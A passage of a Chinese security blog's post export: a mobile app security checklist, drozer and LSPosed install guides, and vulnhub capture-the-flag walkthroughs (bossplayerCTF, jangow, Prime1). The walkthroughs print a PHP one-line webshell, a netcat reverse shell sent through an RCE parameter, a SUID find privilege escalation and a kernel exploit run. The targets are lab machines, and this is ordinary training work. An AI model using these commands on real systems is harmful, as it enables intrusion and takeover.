密码明文存储漏洞"></a>WebView 密码明文存储漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>WebView 默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时会弹出提示框，询问用户是否保存密码，如果选择”是”，密码会被明文保存到 &#x2F;data&#x2F;data&#x2F;com.package.name&#x2F;databases&#x2F;webview.db 中，这样就有被资取密码的危险。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>通过设置 WebSettings.setSavePassword(false) 关闭密码保存提醒功能</p><h1 id="业务逻辑安全"><a href="#业务逻辑安全" class="headerlink" title="业务逻辑安全"></a>业务逻辑安全</h1><h2 id="客户端更新安全性"><a href="#客户端更新安全性" class="headerlink" title="客户端更新安全性"></a>客户端更新安全性</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者拦截替换客户端更新url，导致恶意程序被下载安装</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>对返回数据进行加密</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>drozer安装教程（windows）</title>
      <link href="/install-drozer-on-windows/"/>
      <url>/install-drozer-on-windows/</url>
      
        <content type="html"><![CDATA[<p>drozer这玩意真的是难装啊，之前第一次弄的时候装了两个下午，网上的教程写的乱七八糟的，每次要翻好多篇文章，所以干脆借此次给新电脑装drozer的机会，记录整理一下安装过程，以供后续参考。</p><h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><p>请自行安装以下环境，并配置好环境变量，安装pip包。这里比较简单，就不做赘述了</p><ul><li><p>python 2.7</p></li><li><p>pip2 install protobuf pyOpenSSL Twisted service_identity</p></li><li><p>jdk 1.6 官方推荐的，使用其他版本可能会有问题</p></li><li><p>adb</p></li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><h2 id="下载drozer"><a href="#下载drozer" class="headerlink" title="下载drozer"></a>下载drozer</h2><p>下载链接：<a href="https://github.com/mwrlabs/drozer/releases/">https://github.com/mwrlabs/drozer/releases/</a></p><p>选择系统相应的包，我这里选windows的msi安装包</p><h2 id="安装drozer"><a href="#安装drozer" class="headerlink" title="安装drozer"></a>安装drozer</h2><ol><li>双击安装</li><li>默认install for all user</li><li>Python from another location，下方输入python2.7的安装路径</li></ol><p><img src="/img/image-20230630233756387.png" alt="image-20230630233756387"></p><ol start="4"><li>完成安装</li></ol><h2 id="运行drozer"><a href="#运行drozer" class="headerlink" title="运行drozer"></a>运行drozer</h2><p>cmd中输入 <code>drozer -h</code> </p><p>如果出现drozer的帮助文档，那drozer这边就没问题了</p><blockquote><p>如果出现以下报错，则是python版本问题</p><p><strong>SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(“usage: drozer [COMMAND]”)?</strong></p><p>我把python2.7的命令变成了python2，此时需要编辑drozer.bat，把里面的python改成自己配置的python2就好</p></blockquote><h2 id="安装drozer-agent"><a href="#安装drozer-agent" class="headerlink" title="安装drozer agent"></a>安装drozer agent</h2><p>drozer agent 下载链接：<a href="https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</a></p><p>下载好之后，安装到手机里</p><h2 id="drozer连接手机"><a href="#drozer连接手机" class="headerlink" title="drozer连接手机"></a>drozer连接手机</h2><p>1、打开app，开启drozer agent（右侧显示开启）</p><p>Embedded Server下面的端口，等会会用到</p><p><img src="/img/image-20230701000918341.png" alt="image-20230701000918341"></p><p>2、cmd中输入 <code>adb forward tcp:31415 tcp:31415</code></p><p>这里的31415就是上面drozer agent的端口</p><p>3、cmd中输入 <code>drozer console connect</code></p><p><img src="/img/image-20230701001213155.png" alt="image-20230701001213155"></p><p>出现这个，恭喜你，可以愉快的使用drozer了~</p><p><strong>参考资料</strong></p><ol><li><a href="https://www.cnblogs.com/lsdb/p/9441813.html">drozer安装使用教程（Windows） - 诸子流 - 博客园</a></li><li><a href="https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf">mwri-drozer-user-guide-2015-03-23.pdf</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高版本安卓XPosed框架安装指南</title>
      <link href="/install-xposed-for-android/"/>
      <url>/install-xposed-for-android/</url>
      
        <content type="html"><![CDATA[<p>XPosed框架是一款可以在不修改APK的情况下影响程序运行（修改系统）的框架服务，基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。 </p><p>目前Xposed框架已停止更新，它支持Android 6.0-8.1，但它针对android 8.0和8.1的仅为Beta版本。</p><p>如果想要在高版本安卓系统下使用XPosed，可以考虑以下两种方案：</p><ol><li>Edxposed</li><li>LSPosed（推荐！！！）</li></ol><p>Lsposed 是 Edxposed 的一个新的分支，Lsposed 与Edxposed 相互兼容，却比 Edxposed 更加简洁、易用和高效，是现如今饱受诟病的 Edxposed 的极佳替代品。</p><p>本文主要介绍LSPosed的安装方式</p><h1 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h1><ul><li>安卓版本：8～11</li><li>Magisk v21+、Magisk Manager</li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>1、下载 <a href="https://github.com/LSPosed/LSPosed/releases/latest">LSPosed模块</a></p><p>Riru版需要安装Riru，Zygisk版可以直接在Magisk中打开Zygisk</p><p>这里我下的Zygisk版</p><p>2、打开Zygisk</p><p>Magisk – 右上角【设置】 –  打开Zygisk</p><p><img src="/img/image-20230630130046825.png" alt="image-20230630130046825"></p><p>3、安装LSPosed模块</p><p>Magisk – 模块 – 从本地安装</p><p>选择第一步下载的LSPosed模块，等待安装完成之后，模块下面就会多出一个</p><p><img src="/img/image-20230630130422037.png" alt="image-20230630130422037"></p><p>4、安装LSPosed</p><p>前面第一步下载的那玩意是Magisk里面的LSPosed模块，现在是一个app</p><p>直接在应用商店下就行，我是在Play Store直接下的，没有的话就去网上找找资源</p><p><img src="/img/image-20230630130637206.png" alt="image-20230630130637206"></p><p>5、激活LSPosed</p><p>打开LSPosed app，会显示已经激活</p><p>要是没激活，试试重启大法！</p><p><img src="/img/image-20230630130756179.png" alt="image-20230630130756179"></p><p><strong>参考</strong></p><p><a href="https://magiskcn.com/lsposed-install">LSPosed 安装教程（LSP框架安装教程） - Magisk中文网</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】bossplayerCTF攻略</title>
      <link href="/bossplayer-ctf-walkthrough/"/>
      <url>/bossplayer-ctf-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1、下载虚拟机<br><a href="https://www.vulnhub.com/entry/bossplayersctf-1%2C375/">虚拟机地址</a><br>2、打开虚拟机<br>直接双击ova文件，选择打开方式为VirtualBox即可<br>3、开机，到这个页面就行了<br><img src="/img/image-20221129200026339.png" alt="image-20221129200026339"></p><p>现在可以开始渗透了~</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="靶机IP"><a href="#靶机IP" class="headerlink" title="靶机IP"></a>靶机IP</h2><p>用nmap扫描整个C段，拿到靶机IP（我的网段是192.168.56.x）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span>.<span class="number">56.1</span>/<span class="number">24</span>        </span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200047187.png" alt="image-20221129200047187"><br>扫出三个IP（192.168.56.1是我物理机)<br><strong>Kali：192.168.56.101靶机：192.168.56.102</strong></p><h2 id="访问Web"><a href="#访问Web" class="headerlink" title="访问Web"></a>访问Web</h2><p>靶机开放了80端口，我们访问一下<br><img src="/img/image-20221129200106819.png" alt="image-20221129200106819"><br>就是些靶机作者写的靶机介绍，没啥提示性的信息<br>然后我查看了前端源码，没发现什么。页面上也没有可以点的链接<br>所以接下来尝试目录扫描</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">56.102</span>/</span><br><span class="line"></span><br><span class="line"><span class="literal">----</span> Scanning URL: http://<span class="number">192.168</span>.<span class="number">56.102</span>/ <span class="literal">----</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/index.html (CODE:<span class="number">200</span>|SIZE:<span class="number">575</span>)                                                                                                   </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/robots.txt (CODE:<span class="number">200</span>|SIZE:<span class="number">53</span>)                                                                                                    </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/server<span class="literal">-status</span> (CODE:<span class="number">403</span>|SIZE:<span class="number">302</span>)</span><br></pre></td></tr></table></figure><p>逐一访问上述三个地址</p><ul><li>index.html：就是上面那个刚打开的网页</li><li>robots.txt：出现了下面的文本</li></ul><blockquote><p>super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg&#x3D;&#x3D;</p></blockquote><ul><li>server-status：提示403Forbidden</li></ul><p>所以这一步的关键就在于<code>robots.txt</code>了，接下来我们对拿到的字符进行base64解码（一看第一感觉是base64）</p><blockquote><p>lol try harder bro</p></blockquote><p>被作者嘲笑了。。。<br>找啊找，这靶机作者真的阴啊！在首页源码下面写了一行注释，因为代码只有12行，却把提示信息写到121行，差点就放过去了！拿到一串字符串</p><blockquote><p>WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK</p></blockquote><p>一眼看不知道是啥加密或者编码，我就先试了base64，解出来个这个</p><blockquote><p>ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K</p></blockquote><p>这一看还是编码，而且没有乱码，长度也明显缩短了，所以这很可能是套娃base64，所以接着解密，直到解出来为止</p><blockquote><p>d29ya2luZ2lucHJvZ3Jlc3MucGhwCg&#x3D;&#x3D;</p></blockquote><p>这里以及看出来了，很明显的base64编码特征，再解密：</p><blockquote><p>workinginprogress.php</p></blockquote><p>我们得到了一个php，拼接访问一下</p><h2 id="workinginprogress-php"><a href="#workinginprogress-php" class="headerlink" title="workinginprogress.php"></a>workinginprogress.php</h2><p><img src="/img/image-20221129200131253.png" alt="image-20221129200131253"><br>看这个样子，应该是要Fuzz参数，看他写的Test ping command，感觉可以命令执行，所以写了个命令去Fuzz</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz <span class="literal">-w</span> /usr/share/wfuzz/wordlist/general/common.txt http://<span class="number">192.168</span>.<span class="number">56.102</span>/workinginprogress.php?FUZZ=whoami</span><br></pre></td></tr></table></figure><p>发现<code>cmd</code>这个参数和其他的不一样<br><img src="/img/image-20221129200148707.png" alt="image-20221129200148707"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>浏览器访问一下，有东西，直接RCE（怎么感觉初级基本都这样，直接RCE，这是我打的第二个初级vulnhub靶机，第一个是jangow，那个的RCE比这个还直接）<br><img src="/img/image-20221129200202831.png" alt="image-20221129200202831"><br>我一般喜欢一句话木马和反弹shell双管齐下。一句话木马连上之后，可视化的传文件看文件啥的方便很多，反弹shell到msf，后续使用msf的模块比较方便。<br>这里记录一下路径，方便连webshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>/var/www/html</span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑发现连不上，ls一看，根本就没写进去，尝试新建文件，ls之后发现也没有新建成功，那就只能试试</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali监听4130端口</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">4130</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">workinginprogress.php?cmd=nc <span class="number">192.168</span>.<span class="number">56.101</span> <span class="number">4130</span> <span class="literal">-e</span>/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用交互式命令行</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; uname <span class="literal">-a</span></span><br><span class="line">Linux bossplayers <span class="number">4.19</span>.<span class="number">0</span><span class="literal">-6-amd64</span> <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">&gt; searchsploit debian <span class="number">4.19</span></span><br><span class="line">Exploits: No Results</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>可以看到，内核提权g了</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>之前总结的提权：<a href="https://www.yuque.com/jen413/neiwang/manzoaybnusi9tvo">提权方式</a><br>里面有写到suid提权，这是第一次suid提权实战！<br><strong>① 查找具有suid权限的命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">/usr/lib/eject/dmcrypt<span class="literal">-get-device</span></span><br></pre></td></tr></table></figure><p>② 这里我们选在 find 提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . <span class="literal">-exec</span> /bin/bash <span class="literal">-p</span> \;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200221596.png" alt="image-20221129200221596"><br>可以看到提权成功了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1、切换到root目录下</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、查看目录下文件</span></span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3、查看root.txt</span></span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p>root.txt的内容</p><blockquote><p>Y29uZ3JhdHVsYXRpb25zCg&#x3D;&#x3D;<br>解密之后：congratulations</p></blockquote><p>Done！！！完成啦！</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】jangow1.0.1攻略</title>
      <link href="/jangow-1.0.1-walkthrough/"/>
      <url>/jangow-1.0.1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ul><li><a href="https://www.vulnhub.com/entry/jangow-101,754/">下载靶机</a></li><li>导入虚拟机（<strong>！！！推荐VirtualBox导入</strong>）</li><li>开机</li><li>得到ip</li></ul><h1 id="【issue】开机没有IP"><a href="#【issue】开机没有IP" class="headerlink" title="【issue】开机没有IP"></a>【issue】开机没有IP</h1><p>正常在开机的时候，<code>REDE</code>后面就会有IP，但是我这里没有显示。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>如果你跟我一样，不想下载VirtualBox而使用的是VMWare导入靶机，这里<strong>推荐用VirtualBox</strong>，我下了导入VB，直接解决问题，建议还是下一个哈，Vulnhub里面很多靶机都是ova的，用VB打开会更好。<br>如果你还是不想下，那这里给出我找的教程（比上面复杂，反正我是跟着弄了好一会没成功就放弃了）</p><ul><li><a href="https://www.yuque.com/summerdon/cpubfz/ux121k">Vulnhub靶机检测不到IP-语雀</a></li><li><a href="https://blog.csdn.net/qq_41918771/article/details/103636890">Vulnhub靶机检测不到IP地址_Vicl1fe的博客-CSDN博客</a></li></ul><h1 id="【issue】VM和VB互通问题"><a href="#【issue】VM和VB互通问题" class="headerlink" title="【issue】VM和VB互通问题"></a>【issue】VM和VB互通问题</h1><p>如果你按照上面的解决方案，解决了VMWare导入虚拟机没有IP的问题，那你可以直接忽略这一步，直接开始。<br>此issue针对靶机在VirtualBox，而Kali依旧在VMWare中。这种情况下，由于VM和VB的虚拟网卡不在同一网段，也就是说Kali和靶机之间是不通的。解决方法参考以下博客</p><ul><li><a href="https://blog.csdn.net/qq_43342566/article/details/102679837">如何在vmware上访问virtualbox的虚拟机</a></li></ul><h1 id="拿到IP"><a href="#拿到IP" class="headerlink" title="拿到IP"></a>拿到IP</h1><p>一开机，直接就显示了<br><img src="/img/image-20221129185113854.png" alt="image-20221129185113854"><br>这里我用了两台攻击机：VMWare里面的Kali以及我的本机win10（哪个方便用哪个)</p><ul><li>靶机：192.168.56.118</li><li>Kali：192.168.56.</li><li>win10：192.168.56.1</li></ul><h1 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCTV 192.168.56.118 &gt; jangow.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129190507571.png" alt="image-20221129190507571"><br>扫出了一个21端口和80端口</p><h1 id="访问Web服务"><a href="#访问Web服务" class="headerlink" title="访问Web服务"></a>访问Web服务</h1><ul><li>用HTTP访问上面扫出的80端口</li></ul><p><img src="/img/image-20221129185311777.png" alt="image-20221129185311777"></p><ul><li>进入<code>site</code></li></ul><p><img src="/img/image-20221129185325813.png" alt="image-20221129185325813"><br>随便看了看网页的功能点</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ul><li>点击<code>Buscar</code>，直接跳出个空白页面，参数也没有</li></ul><p><img src="/img/image-20221129185339955.png" alt="image-20221129185339955"></p><ul><li>输入个<code>whoami</code>，好家伙，直接RCE了</li></ul><p><img src="/img/image-20221129185357889.png" alt="image-20221129185357889"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ul><li>直接写入一句话木马</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;&#x27; &gt;&gt; getshell.php</span><br></pre></td></tr></table></figure><ul><li>用蚁剑连上webshell</li><li>蚁剑打开一个虚拟终端，查看系统版本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><ul><li>searchsploit找提权脚本，上传到靶机</li></ul><p><img src="/img/image-20221129185413327.png" alt="image-20221129185413327"></p><ul><li>编译，给权限，执行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod 777 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p>一顿操作之后，虚拟终端一点反应都没有<br><img src="/img/image-20221129185429675.png" alt="image-20221129185429675"><br>于是上网看看大家的操作<br>用反弹shell，和上面一样的步骤，最后提权成功了<br><img src="/img/image-20221129185446656.png" alt="image-20221129185446656"><br>这可能就是蚁剑那个虚拟终端的问题了，至此，我们已经拿到靶机的root权限了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><p>vulnhub里面的靶机，最后的flag基本在<code>/root</code>目录下，切过去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现一个proof.txt，打开看看</span></span><br><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure><p>ok!成功拿到flag<br><img src="/img/image-20221129185459966.png" alt="image-20221129185459966"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体流程比较简单，80页面直接就给了个RCE真的骚<br>过程中还是遇到不少问题，比如</p><ul><li>反弹shell有很多种方式，到底用哪种？这是我不会的地方</li><li>蚁剑的虚拟终端，执行命令会出莫名其妙的问题</li><li>还有反弹shell那块，其实只有443端口是可以出的，其他的都会失败</li></ul><p>感觉那个443出网端口，可能作者并不想我们来反弹shell？</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】Prime1攻略</title>
      <link href="/prime-1-walkthrough/"/>
      <url>/prime-1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p><a href="https://www.vulnhub.com/entry/prime-1,358/">Prime: 1 ~ VulnHub</a></p><h1 id="找靶机IP"><a href="#找靶机IP" class="headerlink" title="找靶机IP"></a>找靶机IP</h1><h2 id="通过Guest确定IP"><a href="#通过Guest确定IP" class="headerlink" title="通过Guest确定IP"></a>通过Guest确定IP</h2><p>最下面，有个Guest用户可以登录进去</p><p><img src="/img/image-20221105143451128.png" alt="image-20221105143451128"></p><p>右键，Open Terminal打开终端窗口</p><p><img src="/img/image-20221103140616028.png" alt="image-20221103140616028"></p><p>直接执行ifconfig，哎~这IP不就拿到了吗？</p><p><img src="/img/image-20221103140855419.png" alt="image-20221103140855419"></p><h2 id="通过扫描确定IP"><a href="#通过扫描确定IP" class="headerlink" title="通过扫描确定IP"></a>通过扫描确定IP</h2><blockquote><p>这是在B站听无涯老师的课程看到的方法</p><p>不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维</p></blockquote><p><strong>用Nmap扫描C段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.120.1/24</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221103141649097.png" alt="image-20221103141649097"></p><p>可以看到，同网段扫到了四个机子，一般*.1*是自己的物理机，太小太大的都不考虑，就剩128和145了，而128是我Kali的IP，所以剩下的145就是靶机的IP了。</p><p>要是觉得上面的方法靠猜测不妥，凭什么要排除太大和太小的IP啊是吧？这里给出另外一种方法。</p><p>刚刚扫一遍，得到4个存活的IP，这时候把靶机给关了，再扫描一遍C段，应该只有三个了，第二次消失的那一个，就是靶机的IP了。</p><p>那找到IP之后，我们要登录这个系统，有什么办法可以找到密码呢？</p><h1 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h1><p>拿到IP之后，可以继续扫描，这个IP开放了哪些端口，都运行着什么服务，也许就能找到突破口呢。</p><p>继续<strong>用Nmap扫全端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.120.145</span><br></pre></td></tr></table></figure><blockquote><p>这里通过-p参数指定全端口，不指定的话，只会扫描常用端口</p></blockquote><p><img src="/img/image-20221103143407496.png" alt="image-20221103143407496"></p><p>扫到2个端口，22和80，对应的服务，也写出来了</p><blockquote><p>如果扫出来的端口比较陌生，不知道运行着什么服务，可以百度查询</p><p>这里给出一份<a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">常用的端口对应的服务</a></p></blockquote><p>22端口是SSH服务，无非就是用Xshell去连接，没啥突破口。</p><p>80端口开放的是HTTP服务，也就是有Web服务啊！！！那不开整？</p><h1 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h1><p>用浏览器打开上面开放的80端口</p><p><strong>访问网址</strong>：IP:port，我这里就是192.168.120.145:80（其实直接输入ip就可以访问了，应为HTTP协议默认就是80端口）</p><p><img src="/img/image-20221103144324733.png" alt="image-20221103144324733"></p><p>嗯？？这什么情况？？WTF？？？就一张图片？？？玩呢？？</p><p>冷静冷静哈！思考下，遇到就一张图片，有什么思路可以进行下去？</p><ul><li>CMS指纹识别</li><li>Ctrl+U查看前端源码</li><li>目录扫描</li></ul><p>思路列出来了，一个个尝试吧</p><p>CMS指纹识别，壮烈牺牲</p><p><img src="/img/image-20221103144853909.png" alt="image-20221103144853909"></p><p>emmm源码就。。。算了吧</p><p><img src="/img/image-20221103145005398.png" alt="image-20221103145005398"></p><p>那就只有<strong>目录扫描</strong>了</p><p>问题是怎么扫呢？用啥工具呢？</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>工具</p><ul><li>dirb</li><li>御剑</li><li>webscan</li><li>gobuster</li><li>dirsearch</li><li>BurpSuite</li><li>………（工具很多）</li></ul><p>我打开dirb就是一顿扫（kali自带dirb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145</span><br></pre></td></tr></table></figure><p>啊嘞？还有工具连-u都不要加的？不管，看结果</p><p><img src="/img/image-20221103160653117.png" alt="image-20221103160653117"></p><p>扫出了一个WordPress，一看就知道，这是个个人博客。</p><p>打开看看，果然！有没有发现这个victor有点似曾相识？？</p><p><img src="/img/image-20221103160539432.png" alt="image-20221103160539432"></p><p>嘚，白高兴一场，啥也没有发现。</p><p>接下来又看了看扫出来的其他目录，全是WordPress的大概看了下，这条路肝不下去了。</p><p>只能想想有没有其他办法。密码有没有可能存在一个文件里？首先想到的就是txt，接着我又用dirb对txt后缀的来了一顿扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .txt</span><br></pre></td></tr></table></figure><p>欸？？？这是啥？<code>secret.txt</code>？？？赶紧打开看看</p><p><img src="/img/image-20221103161740535.png" alt="image-20221103161740535"></p><p>果然有东西啊！！（Prime1：看你太菜了给你点提示吧）</p><p><img src="/img/image-20221103161920266.png" alt="image-20221103161920266"></p><p>整段翻译如下</p><blockquote><p>小伙子有点东西啊！</p><p>但还是菜了点哟！给你点提示：</p><p><strong>对你发现的每一页php做一些Fuzz，如果Fuzz到了正确的参数，然后照着下面的步骤做</strong></p><p><strong>查看<code>location.txt</code>，你就知道下一步该怎么走了。</strong></p><p>如果你还是菜的不行，来<a 